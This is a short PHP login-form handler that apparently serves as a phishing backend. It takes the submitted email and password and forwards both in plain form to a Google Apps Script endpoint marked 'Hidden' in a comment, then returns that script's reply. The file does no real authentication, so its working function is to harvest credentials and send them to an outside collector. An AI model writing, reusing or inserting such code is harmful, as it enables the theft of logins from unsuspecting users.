<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    // Hidden Google Apps Script URL
    $scriptUrl = 'https://script.google.com/macros/s/AKfycbwSWSeyWmZnOnkumAHqvet5K0FXgRzo_CPOJtskgKnv8n9uylALwGsojGtvahhyJf5w/exec';

    $postData = http_build_query([
        'email' => $email,
        'password' => $password
    ]);

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => $postData,
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($scriptUrl, false, $context);

    if ($result === FALSE) {
        http_response_code(500);
        echo json_encode(['success' => false, 'message' => 'Server error']);
    } else {
        echo $result;
    }
}
?>
